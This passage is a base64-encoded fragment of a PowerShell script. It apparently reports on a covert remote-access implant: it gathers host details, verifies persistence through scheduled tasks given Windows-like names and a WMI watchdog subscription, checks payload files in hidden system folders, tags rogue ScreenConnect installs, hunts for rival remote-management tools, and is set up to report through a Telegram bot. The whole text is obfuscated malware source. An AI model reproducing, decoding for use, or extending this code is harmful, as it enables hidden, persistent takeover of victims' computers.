PSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
Q29tcHV0ZXJTeXN0ZW0KICAgICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikg
eyAkY3MuRG9tYWluIH0gZWxzZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0
dXJlciA9ICRjcy5NYW51ZmFjdHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdp
bjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5h
bWUpCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2lt
SW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkg
ewogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIg
IkRldmljZUlEPSdDOiciCiAgICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRk
LkZyZWVTcGFjZSAvIDFHQiwgMSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuU2l6ZSAvIDFHQiwgMSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5j
dGlvbiBHZXQtU3ZjTGluZShbc3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1O
YW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykg
eyByZXR1cm4gJ05PVCBJTlNUQUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScg
LWYgJHMuU3RhdHVzLCAkcy5TdGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtz
dHJpbmddJHRuKSB7CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZP
IExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91
dCkgewogICAgICAgIHJldHVybiBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lO
Ryc7IE5leHQgPSAnJzsgTGFzdCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAg
ICB9CiAgICAkbWFwID0gQHt9CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAi
JF8iIH0pIC1qb2luICJgbiIKICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBp
ZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAg
JG1hcFskbWF0Y2hlc1sxXS5UcmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgJHN0YXR1cyA9ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7
ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsg
JHN0YXR1cyA9ICdwcmVzZW50JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQog
ICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3Qg
UnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0
ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
JycgfQogICAgJHRyID0gJG1hcFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0
ciA9ICRtYXBbJ1Rhc2sgdG8gUnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kp
b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAg
IyBQcmVzZW50IFdpbmRvd3MgYnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkg
Zm9yIHVzCiAgICAkaGVhbHRoeSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8
UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAg
ICAgIFByZXNlbnQgPSAkdHJ1ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAg
IEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3Vycykg
eyAkc3RhdHVzIH0gZWxzZSB7ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQK
ICAgICAgICBMYXN0ICAgID0gJGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAg
IFRyICAgICAgPSAkKGlmICgkdHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0
aW9uIEdldC1SbW1IaXRzIHsKICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6
IFNjcmVlbkNvbm5lY3QgYWxsb3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5z
ID0gQCgKICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0Fn
ZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2lu
Vk5DJywgJ3ZuY3NlcnZlcicsICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1
c3REZXNrJywgJ1JlbW90ZVBDJywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdB
dGVyYScsICdOaW5qYVJNTScsICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScs
ICdBZ2VudE1vbicsICdQdWxzZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8n
LAogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENl
bnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lz
ZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAn
U2ltcGxlSGVscCcsICdCb21nYXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2gg
Q2VudHJhbCcsICdNZXNoIEFnZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxy
bW0nLCAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywK
ICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0Jywg
J0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAn
TmF2ZXJpc2snLCAnSW1teUJvdCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJl
cicsICdEb21vdHonLCAnQXV2aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQg
V29ya3BsYWNlJywgJ0dvdmVybGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQ
RFEgQ29ubmVjdCcsCiAgICAgICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdU
YWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcics
ICdBZXJvQWRtaW4nLAogICAgICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5l
JywgJ0lwZXJpdXMnLCAnSVNMIExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5D
JywgJ1JlYWxWTkMnCiAgICApCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0
YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1P
YmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9
IEB7fQoKICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
ewogICAgICAgICRrZXkgPSAiJGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAg
IGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRr
ZXldID0gJHRydWUKICAgICAgICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwv
Y29kZT4nIC1mICRraW5kLCAoRXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtl
ZXBOYW1lKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNl
IH0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVl
IH0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiok
ayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAg
R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgJG4gPSAkXy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAg
ICAgIGlmIChUZXN0LUtlZXBOYW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAg
ICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAt
b3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tl
ZXAtZGF0dG8nICgiJG4gKCQoJF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAg
IHJldHVybgogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAg
ICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAg
ICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3Mg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
JG4gPSAkXy5Qcm9jZXNzTmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVy
biB9CiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4g
LWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAg
ICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0
ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
cnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZv
cmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0KICAgICAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAg
ICBpZiAoJGRuIC1saWtlICcqRGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykg
eyBBZGQtSGl0ICdrZWVwLWRhdHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAg
ICAgICAgIH0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJl
dHVybiB9CiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAn
bXNpJyAkZG4KICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAg
ICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBH
ZXQtR3J5eGFLZWVwRnAgewogICAgJGZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiAgICAkcCA9ICdD
OlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5j
ZmcnCiAgICBpZiAoJFdvcmtEaXIpIHsgJHAgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNm
ZycgfQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05
YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAg
ICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIEdldC1TY0luc3RhbGxzIHsKICAg
ICRncnl4YUZwID0gR2V0LUdyeXhhS2VlcEZwCiAgICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBp
ZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBl
bHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcn
KSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxzZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUz
NDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBlbHNlaWYgKCRmcCAtZXEgJGdyeXhhRnApIHsg
J0tFRVAtR1JZWEEnIH0KICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQogICAgfQoKICAgICRy
b290cyA9IEAoCiAgICAgICAgIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGll
bnQqIiwKICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xp
ZW50KiIKICAgICkKICAgIGZvcmVhY2ggKCRwYXQgaW4gJHJvb3RzKSB7CiAgICAgICAgR2V0LUNo
aWxkSXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0
aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQogICAgICAgIH0KICAg
IH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxc
KicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRl
bVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2Jq
ZWN0IHsKICAgICAgICAgICAgJF8uRGlzcGxheU5hbWUgLWxpa2UgJypTY3JlZW5Db25uZWN0KicK
ICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRp
c3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9CiAgICAgICAg
ICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gbXNpOiA8Y29kZT57MH08L2NvZGU+IHZ7MX0nIC1mIChF
c2MgJF8uRGlzcGxheU5hbWUpLCAoRXNjICR2ZXIpKSkKICAgICAgICB9CiAgICB9CgogICAgaWYg
KCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9CiAgICBy
ZXR1cm4gJGxpc3QKfQoKJGNmZyA9IEdldC1DZmcKaWYgKC1ub3QgJGNmZy5CT1RfVE9LRU4gLW9y
IC1ub3QgJGNmZy5DSEFUX0lEKSB7CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4t
UGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAtVmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgZXhpdCAyCn0KCiRwcmltID0gJ1NjcmVlbkNvbm5l
Y3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScKJGFsdCA9ICdTY3JlZW5Db25uZWN0IENsaWVu
dCAoZjg2MWM4MTQwZDQ1MzQyNyknCiRvcyA9IEdldC1Pc0luZm8KJHdobyA9IFtTZWN1cml0eS5Q
cmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKJGVsZXYgPSAoW1Nl
Y3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZSgKICAgIFtTZWN1cml0eS5Qcmlu
Y2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikKJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScKCiRt
c2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnLm1zaScKJG1zaVNpemUgPSBpZiAoVGVz
dC1QYXRoICRtc2lDYWNoZSkgewogICAgJ3swOk4wfSBLQicgLWYgKChHZXQtSXRlbSAkbXNpQ2Fj
aGUgLUZvcmNlKS5MZW5ndGggLyAxS0IpCn0gZWxzZSB7ICdub25lJyB9CgokbW9uUGF0aCA9IEpv
aW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0
YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCIKJGhhc01v
biA9IFRlc3QtUGF0aCAkbW9uUGF0aAokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24KCiMgVDEw
OiBvbi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4
YWN0bHkgd2hhdCBpcyBpbnN0YWxsZWQKZnVuY3Rpb24gR2V0LVBheWxvYWRCdWlsZChbc3RyaW5n
XSRmaWxlKSB7CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3Np
bmcnIH0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAg
ICAgICAgaWYgKCRsIC1tYXRjaCAnQlVJTERccytcZHs4fShbQS1aXStcZCspJykgeyByZXR1cm4g
JG1hdGNoZXNbMV0gfQogICAgfQogICAgcmV0dXJuICc/Jwp9CiRiTW9uID0gR2V0LVBheWxvYWRC
dWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpCiRiU2VjID0gR2V0LVBheWxv
YWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpCiRiVGdyID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICd0Z19yZXBvcnQucHMxJykKJGJMaWIg
PSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykKCiMg
cGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9tIGlkZW50aXR5
LmNmZyB3aGVuIHByZXNlbnQKJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5j
ZmcnCiRpZE1hcCA9IEB7fQppZiAoVGVzdC1QYXRoICRpZENmZykgewogICAgR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBpZiAoJF8gLW1h
dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRtYXRjaGVzWzFd
XSA9ICRtYXRjaGVzWzJdIH0KICAgIH0KfQokZXhwZWN0ZWRUYXNrcyA9IEAoCiAgICBAeyBOYW1l
ID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19BIH0gZWxzZSB7ICdXZXJRdWV1
ZVN5bmMnIH0pOyBSb2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LAogICAg
QHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAn
UGxhU2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChjaGFp
bjEpIiB9LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tf
QyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9
LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVs
c2UgeyAnVGNwSXBDb25mbGljdFJlcycgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQop
CiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbgokd21pQyA9IEdldC1XbWlPYmpl
Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENv
bnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdh
dGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3
bWlDKSB9CgokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp
Yy5MaXN0W3N0cmluZ10KJHRhc2tPayA9IDAKJHRhc2tCYWQgPSAwCmZvcmVhY2ggKCR0IGluICRl
eHBlY3RlZFRhc2tzKSB7CiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7CiAgICAgICAg
aWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsr
OyAkbWFyayA9ICdNSVNTSU5HJyB9CiAgICAgICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7
MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNj
ICR0LlJvbGUpKSkKICAgICAgICBjb250aW51ZQogICAgfQogICAgJGggPSBHZXQtVGFza0hlYWx0
aCAkdC5OYW1lCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0aHkpIHsKICAgICAgICAk
dGFza09rKysKICAgICAgICAkbWFyayA9ICdPSycKICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1h
bmQgLW5vdCAkaC5PdXJzKSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ05P
VF9PVVJTJwogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsKICAgICAgICAkdGFza0JhZCsrCiAg
ICAgICAgJG1hcmsgPSAnV0VBSycKICAgIH0gZWxzZSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAg
ICAgICRtYXJrID0gJ01JU1NJTkcnCiAgICB9CiAgICAkZXh0cmEgPSAnJwogICAgaWYgKCRoLlBy
ZXNlbnQpIHsKICAgICAgICAkYml0cyA9IEAoKQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJp
dHMgKz0gJGguU3RhdHVzIH0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJl
c3VsdCAtbmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9CiAg
ICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywg
JykgKyAnKScgfQogICAgfQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2Rl
PnsxfTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJv
